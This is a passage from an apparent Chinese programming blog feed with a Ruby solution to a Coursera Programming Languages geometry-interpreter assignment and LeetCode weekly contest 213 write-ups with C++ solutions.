<span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    LineSegment.new(@x1 + dx,@y1 + dy,@x2 + dx,@y2 + dy)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersect</span> <span class="title">other</span></span></span><br><span class="line">    other.intersectLineSegment <span class="keyword">self</span> <span class="comment"># will be NoPoints but follow double-dispatch</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectPoint</span> <span class="title">p</span></span></span><br><span class="line">    p.intersectLineSegment <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectLine</span> <span class="title">line</span></span></span><br><span class="line">    line.intersectLineSegment <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectVerticalLine</span> <span class="title">vline</span></span></span><br><span class="line">    vline.intersectLineSegment <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># if self is the intersection of (1) some shape s and (2) </span></span><br><span class="line">  <span class="comment"># the line containing seg, then we return the intersection of the </span></span><br><span class="line">  <span class="comment"># shape s and the seg.  seg is an instance of LineSegment</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">intersectWithSegmentAsLineResult</span> <span class="title">seg</span></span></span><br><span class="line">    <span class="keyword">if</span> real_close(@x1,@x2)</span><br><span class="line">      <span class="keyword">if</span> @y1 &lt; seg.y1</span><br><span class="line">        aXstart = @x1</span><br><span class="line">        aYstart = @y1</span><br><span class="line">        aXend   = @x2</span><br><span class="line">        aYend   = @y2</span><br><span class="line">        bXstart = seg.x1</span><br><span class="line">        bYstart = seg.y1</span><br><span class="line">        bXend   = seg.x2</span><br><span class="line">        bYend   = seg.y2</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        aXstart = seg.x1</span><br><span class="line">        aYstart = seg.y1</span><br><span class="line">        aXend   = seg.x2</span><br><span class="line">        aYend   = seg.y2</span><br><span class="line">        bXstart = @x1</span><br><span class="line">        bYstart = @y1</span><br><span class="line">        bXend   = @x2</span><br><span class="line">        bYend   = @y2</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> real_close(aYend,bYstart)</span><br><span class="line">        Point.new(aXend,aYend)</span><br><span class="line">      <span class="keyword">elsif</span>  aYend &lt; bYstart</span><br><span class="line">        NoPoints.new()</span><br><span class="line">      <span class="keyword">elsif</span>  aYend &gt; bYend</span><br><span class="line">        LineSegment.new(bXstart,bYstart,bXend,bYend)</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        LineSegment.new(bXstart,bYstart,aXend,aYend)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span> @x1 &lt; seg.x1</span><br><span class="line">        aXstart = @x1</span><br><span class="line">        aYstart = @y1</span><br><span class="line">        aXend   = @x2</span><br><span class="line">        aYend   = @y2</span><br><span class="line">        bXstart = seg.x1</span><br><span class="line">        bYstart = seg.y1</span><br><span class="line">        bXend   = seg.x2</span><br><span class="line">        bYend   = seg.y2</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        aXstart = seg.x1</span><br><span class="line">        aYstart = seg.y1</span><br><span class="line">        aXend   = seg.x2</span><br><span class="line">        aYend   = seg.y2</span><br><span class="line">        bXstart = @x1</span><br><span class="line">        bYstart = @y1</span><br><span class="line">        bXend   = @x2</span><br><span class="line">        bYend   = @y2</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> real_close(aXend,bXstart)</span><br><span class="line">        Point.new(aXend,aYend)</span><br><span class="line">      <span class="keyword">elsif</span> aXend &lt; bXstart</span><br><span class="line">        NoPoints.new()</span><br><span class="line">      <span class="keyword">elsif</span> aXend &gt; bXend</span><br><span class="line">        LineSegment.new(bXstart,bYstart,bXend,bYend)</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">        LineSegment.new(bXstart,bYstart,aXend,aYend)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: there is no need for getter methods for the non-value classes</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Intersect</span> &lt; GeometryExpression</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(e1,e2)</span></span></span><br><span class="line">    @e1 = e1</span><br><span class="line">    @e2 = e2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span></span></span><br><span class="line">    @e1.eval_prog(env).intersect(@e2.eval_prog(env))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    Intersect.new(@e1.preprocess_prog, @e2.preprocess_prog)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Let</span> &lt; GeometryExpression</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line">  <span class="comment"># Note: Look at Var to guide how you implement Let</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(s,e1,e2)</span></span></span><br><span class="line">    @s = s</span><br><span class="line">    @e1 = e1</span><br><span class="line">    @e2 = e2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span></span></span><br><span class="line">    newEnv = [[@s,@e1.eval_prog(env)]] + env</span><br><span class="line">    @e2.eval_prog(newEnv)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    Let.new(@s,@e1.preprocess_prog,@e2.preprocess_prog)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Var</span> &lt; GeometryExpression</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span> <span class="title">s</span></span></span><br><span class="line">    @s = s</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span> <span class="comment"># remember: do not change this method</span></span></span><br><span class="line">    pr = env.assoc @s</span><br><span class="line">    raise <span class="string">"undefined variable"</span> <span class="keyword">if</span> pr.<span class="literal">nil</span>?</span><br><span class="line">    pr[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shift</span> &lt; GeometryExpression</span></span><br><span class="line">  <span class="comment"># *add* methods to this class -- do *not* change given code and do not</span></span><br><span class="line">  <span class="comment"># override any methods</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(dx,dy,e)</span></span></span><br><span class="line">    @dx = dx</span><br><span class="line">    @dy = dy</span><br><span class="line">    @e = e</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">eval_prog</span> <span class="title">env</span></span></span><br><span class="line">    @e.eval_prog(env).shift(@dx,@dy);</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">preprocess_prog</span></span></span><br><span class="line">    Shift.new(@dx,@dy,@e.preprocess_prog)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(dx,dy)</span></span></span><br><span class="line">    <span class="keyword">self</span></span><br><span class="line">  <span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p><code>week3</code>部分并没有讲太多的新东西，但是该部分主要讲述了<code>subclass</code> 的<code>type</code> 的问题，详细的描述子类的类型如何在特定情况下去匹配父类的类型，总的来说，因为是英文的原因，我也听的云里雾里，，但是通过几个<code>example</code>还是了解到一点基本的皮毛，对于<code>子类型</code>的问题在实际工程代码实践中应该严格的要处理好该问题。但是如何在设计非常优雅，还是要考虑设计功底。里面其实重要的一个概念就是<code>面向对象</code>的多态的问题的处理。<br>另外一部分讲述了通用类型<code>T</code>的基本概念，这些在<code>java</code>或者<code>C#</code>中都是非常重要的基本概念，最后的是一个<code>final exam</code>，难度超高，一直都还没哟通过，因为对于<code>programming languages</code>这门课程中的好多概念我到现在还是云里雾里，不想再在<code>PL</code>上深入探讨了，确实是个非常理论的学科，难怪<code>王垠</code>对<code>PL</code>领域如此执着，里面的坑太多了，概念太多了，也非常的难懂。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;programming-languages-PARTC-总结&quot;&gt;&lt;a href=&quot;#programming-languages-PARTC-总结&quot; class=&quot;headerlink&quot; title=&quot;programming languages PARTC 总结&quot;&gt;&lt;/a&gt;programming languages PARTC 总结&lt;/h1&gt;&lt;p&gt;终于完成了&lt;code&gt;UWL&lt;/code&gt;的&lt;code&gt;programming languages&lt;/code&gt;的系列课程和&lt;code&gt;project&lt;/code&gt;.感觉&lt;code&gt;part3&lt;/code&gt;部分没有前两部分有意思，这部分主要讲的&lt;code&gt;object Oriented programming&lt;/code&gt;，没有前两章的&lt;code&gt;functional programming&lt;/code&gt;有意思，不过课后的&lt;code&gt;project&lt;/code&gt;还是一如既往的有深度，有思考的地方，硬着头皮把两个&lt;code&gt;project&lt;/code&gt;完成了，其实学习&lt;code&gt;coursera&lt;/code&gt;课程，最满意的就是它的&lt;code&gt;project&lt;/code&gt;了，非常有难度和深入思考的地方。后面准备尝试下&lt;code&gt;mit&lt;/code&gt;和&lt;code&gt;cmu&lt;/code&gt;的公开课课程，听说这些著名大学的&lt;code&gt;lab&lt;/code&gt;都是非常的难，非常期待这种有难度和深入思考的&lt;code&gt;lab&lt;/code&gt;.&lt;/p&gt;
    
    </summary>
    
    
      <category term="公开课" scheme="http://yoursite.com/categories/%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    
    
      <category term="coursera" scheme="http://yoursite.com/tags/coursera/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】 周赛213场</title>
    <link href="http://yoursite.com/2020/11/01/218/"/>
    <id>http://yoursite.com/2020/11/01/218/</id>
    <published>2020-11-01T12:27:02.437Z</published>
    <updated>2020-11-03T14:36:52.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-213"><a href="#leetcode-contest-213" class="headerlink" title="leetcode contest 213"></a>leetcode contest 213</h1><p>周赛的题目竟然比双周赛还简单。</p><h2 id="5554-能否连接形成数组"><a href="#5554-能否连接形成数组" class="headerlink" title="5554. 能否连接形成数组"></a>5554. 能否连接形成数组</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>arr</code>，数组中的每个整数 互不相同 。另有一个由整数数组构成的数组 <code>pieces</code>，其中的整数也 互不相同 。请你以 任意顺序 连接 <code>pieces</code>中的数组以形成 <code>arr</code> 。但是，不允许 对每个数组 <code>pieces[i]</code>中的整数重新排序。</p><a id="more"></a><p>如果可以连接 <code>pieces</code>中的数组形成 <code>arr</code> ，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p><p>示例 1：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">85</span>], pieces = <span class="string">[[85]]</span></span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">15</span>,<span class="number">88</span>], pieces = [[<span class="number">88</span>],[<span class="number">15</span>]]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：依次连接 [<span class="number">15</span>] 和 [<span class="number">88</span>]</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">49</span>,<span class="number">18</span>,<span class="number">16</span>], pieces = [[<span class="number">16</span>,<span class="number">18</span>,<span class="number">49</span>]]</span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：即便数字相符，也不能重新排列 pieces[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">91</span>,<span class="number">4</span>,<span class="number">64</span>,<span class="number">78</span>], pieces = [[<span class="number">78</span>],[<span class="number">4</span>,<span class="number">64</span>],[<span class="number">91</span>]]</span><br><span class="line">输出：<span class="literal">true</span></span><br><span class="line">解释：依次连接 [<span class="number">91</span>]、[<span class="number">4</span>,<span class="number">64</span>] 和 [<span class="number">78</span>]</span><br></pre></td></tr></table></figure><br>示例 5：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>], pieces = [[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>]]</span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= pieces.length &lt;= arr.length &lt;= 100</code></li><li><code>sum(pieces[i].length) == arr.length</code></li><li><code>1 &lt;= pieces[i].length &lt;= arr.length</code></li><li><code>1 &lt;= arr[i], pieces[i][j] &lt;= 100</code></li><li><code>arr</code> 中的整数 互不相同</li><li><code>pieces</code> 中的整数 互不相同（也就是说，如果将 <code>pieces</code> 扁平化成一维数组，数组中的所有整数互不相同）<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><a href="https://leetcode-cn.com/contest/weekly-contest-213/problems/check-array-formation-through-concatenation/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/weekly-contest-213/problems/check-array-formation-through-concatenation/</a><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  窗口匹配</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>因为数组中每个元素都各不相同，所以非常简单处理即可搞定，每次检查子数组是否为原数组的一部分。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canFormArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; pieces)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        <span class="keyword">int</span> m = pieces.size();</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">            cnt[arr[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="comment">//cout&lt;&lt;pieces[i][0]&lt;&lt;endl;</span></span><br><span class="line">            <span class="keyword">if</span>(cnt.count(pieces[i][<span class="number">0</span>]))&#123;</span><br><span class="line">                <span class="keyword">int</span> idx = cnt[pieces[i][<span class="number">0</span>]];</span><br><span class="line">                <span class="comment">//cout&lt;&lt;idx&lt;&lt;endl;</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; pieces[i].size(); ++j)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(pieces[i][j] != arr[idx+j]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//cout&lt;&lt;i&lt;&lt;endl;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="5555-统计字典序元音字符串的数目"><a href="#5555-统计字典序元音字符串的数目" class="headerlink" title="5555. 统计字典序元音字符串的数目"></a>5555. 统计字典序元音字符串的数目</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数 n，请返回长度为 n 、仅由元音<code>(a, e, i, o, u)</code>组成且按 字典序排列 的字符串数量。</p><p>字符串 s 按 字典序排列 需要满足：对于所有有效的 i，<code>s[i]</code> 在字母表中的位置总是与 <code>s[i+1]</code>相同或在 <code>s[i+1]</code>之前。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">1</span></span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：仅由元音组成的 <span class="number">5</span> 个字典序字符串为 [<span class="string">"a"</span>,<span class="string">"e"</span>,<span class="string">"i"</span>,<span class="string">"o"</span>,<span class="string">"u"</span>]</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">2</span></span><br><span class="line">输出：<span class="number">15</span></span><br><span class="line">解释：仅由元音组成的 <span class="number">15</span> 个字典序字符串为</span><br><span class="line">[<span class="meta"><span class="meta-string">"aa"</span>,<span class="meta-string">"ae"</span>,<span class="meta-string">"ai"</span>,<span class="meta-string">"ao"</span>,<span class="meta-string">"au"</span>,<span class="meta-string">"ee"</span>,<span class="meta-string">"ei"</span>,<span class="meta-string">"eo"</span>,<span class="meta-string">"eu"</span>,<span class="meta-string">"ii"</span>,<span class="meta-string">"io"</span>,<span class="meta-string">"iu"</span>,<span class="meta-string">"oo"</span>,<span class="meta-string">"ou"</span>,<span class="meta-string">"uu"</span></span>]</span><br><span class="line">注意，<span class="string">"ea"</span> 不是符合题意的字符串，因为 <span class="string">'e'</span> 在字母表中的位置比 <span class="string">'a'</span> 靠后</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">33</span></span><br><span class="line">输出：<span class="number">66045</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 50</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/count-sorted-vowel-strings" target="_blank" rel="noopener">https://leetcode-cn.com/problems/count-sorted-vowel-strings</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> dp</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>简单的dp即可。<code>dp[i][j]</code>代表前长度为<code>i</code>，且以字符<code>j</code>结尾的数量，dp`的递推公式为：<script type="math/tex; mode=display">dp[i][j] = \sum_{k=1}^{j}dp[i-1][k]</script><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countVowelStrings</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; dp(n+<span class="number">1</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="number">5</span>,<span class="number">0</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) dp[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= j; ++k) </span><br><span class="line">                    dp[i][j] += dp[i<span class="number">-1</span>][k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)&#123;</span><br><span class="line">            ans += dp[n][i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5556-可以到达的最远建筑"><a href="#5556-可以到达的最远建筑" class="headerlink" title="5556. 可以到达的最远建筑"></a>5556. 可以到达的最远建筑</h2><p>给你一个整数数组 <code>heights</code>，表示建筑物的高度。另有一些砖块 <code>bricks</code> 和梯子 <code>ladders</code>。</p><p>你从建筑物 0 开始旅程，不断向后面的建筑物移动，期间可能会用到砖块或梯子。</p><p>当从建筑物 i 移动到建筑物 i+1（下标 从 0 开始 ）时：</p><ul><li>如果当前建筑物的高度 大于或等于 下一建筑物的高度，则不需要梯子或砖块</li><li>如果当前建筑的高度 小于 下一个建筑的高度，您可以使用 一架梯子 或 <code>(h[i+1] - h[i])</code>个砖块</li><li>如果以最佳方式使用给定的梯子和砖块，返回你可以到达的最远建筑物的下标（下标 从 0 开始 ）。</li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：heights = [<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">12</span>], bricks = <span class="number">5</span>, ladders = <span class="number">1</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：从建筑物 <span class="number">0</span> 出发，你可以按此方案完成旅程：</span><br><span class="line">- 不使用砖块或梯子到达建筑物 <span class="number">1</span> ，因为 <span class="number">4</span> &gt;= <span class="number">2</span></span><br><span class="line">- 使用 <span class="number">5</span> 个砖块到达建筑物 <span class="number">2</span> 。你必须使用砖块或梯子，因为 <span class="number">2</span> &lt; <span class="number">7</span></span><br><span class="line">- 不使用砖块或梯子到达建筑物 <span class="number">3</span> ，因为 <span class="number">7</span> &gt;= <span class="number">6</span></span><br><span class="line">- 使用唯一的梯子到达建筑物 <span class="number">4</span> 。你必须使用砖块或梯子，因为 <span class="number">6</span> &lt; <span class="number">9</span></span><br><span class="line">无法越过建筑物 <span class="number">4</span> ，因为没有更多砖块或梯子。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：heights = [<span class="number">4</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">18</span>,<span class="number">20</span>,<span class="number">3</span>,<span class="number">19</span>], bricks = <span class="number">10</span>, ladders = <span class="number">2</span></span><br><span class="line">输出：<span class="number">7</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：heights = [<span class="number">14</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">3</span>], bricks = <span class="number">17</span>, ladders = <span class="number">0</span></span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= heights.length &lt;= 105</code></li><li><code>1 &lt;= heights[i] &lt;= 106</code></li><li><code>0 &lt;= bricks &lt;= 109</code></li><li><code>0 &lt;= ladders &lt;= heights.length</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/furthest-building-you-can-reach" target="_blank" rel="noopener">https://leetcode-cn.com/problems/furthest-building-you-can-reach</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>这个题目跟以前很多类似的题目相似。当后一个建筑大于前一个建筑时，我们首先尝试用砖块来跨越建筑，如果发现当前的砖块不够用时，此时我们将某次用的最大砖块$max[i]$换成梯子来替换，同时将消耗的最大砖块$max[i]$再换回来。</li><li>我们用优先级队列保存当前每次消耗的砖块，当砖块不够时，我们则从队列中弹出最大值，用梯子替换，然后恢复砖块。</li><li>时间复杂度为$O(n\lg{n})$.<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 